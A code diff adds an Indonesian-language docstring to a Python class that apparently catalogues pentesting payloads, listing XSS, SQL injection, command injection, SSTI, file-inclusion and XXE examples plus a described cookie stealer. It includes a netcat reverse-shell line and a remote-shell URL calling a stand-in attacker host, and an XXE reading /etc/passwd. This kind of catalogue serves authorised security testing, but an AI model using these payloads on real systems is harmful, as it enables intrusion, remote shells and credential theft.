@@ -1,5 +1,59 @@
 # * Pustaka Script Payload Pentesting (v5.9 Script Section)
 class ScriptLibrary:
+    """
+    ScriptLibrary itu kayak gudang senjata lengkap buat penetration testing!
+    
+    Di sini ada 100+ payload siap pakai untuk berbagai situasi:
+    
+    📁 KATEGORI PAYLOAD:
+    
+    1. XSS (Cross-Site Scripting) - 20+ varian
+       - Basic: <script>alert('XSS')</script>
+       - IMG Tag: <img src=x onerror=alert('XSS')>
+       - SVG: <svg/onload=alert('XSS')>
+       - Cookie Stealer: Kirim cookie korban ke server attacker
+       - Dan masih banyak lagi...
+    
+    2. SQL Injection - 15+ varian
+       - Basic: ' OR 1=1--
+       - UNION SELECT: ' UNION SELECT 1,2,3--
+       - Blind SQLi: AND 1=1, AND 1=2
+       - Time-based: WAITFOR DELAY, SLEEP()
+    
+    3. Command Injection - 10+ varian
+       - Linux: ; id, | whoami, `sleep 5`
+       - Windows: & whoami, | dir
+       - Reverse shell: $(nc -e /bin/sh attacker.com 1337)
+    
+    4. SSTI (Server-Side Template Injection)
+       - Jinja2: {{7*7}}, {{config}}
+       - Twig: {{7*'7'}}, {{_self.env}}
+       - Freemarker: ${7*7}, ${freemarker}
+    
+    5. LFI/RFI (Local/Remote File Inclusion)
+       - ../../etc/passwd
+       - php://filter, data://text
+       - http://attacker.com/shell.txt
+    
+    6. XXE (XML External Entity)
+       - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    
+    🎯 FITUR UNGGULAN:
+    
+    - DRAG & DROP - Tinggal drag script ke desktop/folder
+    - PREVIEW - Liat isi script sebelum dipake
+    - SEARCH - Cari payload berdasarkan nama/kategori
+    - RISK LEVEL - Label bahaya (Low/Medium/High/Critical)
+    - SEND TO TERMINAL - Kirim payload langsung ke terminal
+    - GENERATE FILE - Save script ke folder
+    
+    ⚠️ INGAT: Payload ini SENJATA!
+    - Pake hanya untuk testing yang ADA IJIN
+    - Jangan pernah pake untuk kejahatan
+    - Bertanggung jawab atas setiap aksi
+    
+    "With great power comes great responsibility!" - Uncle Ben
+    """
     def __init__(self):
         self.scripts = self._buildDatabase()
 
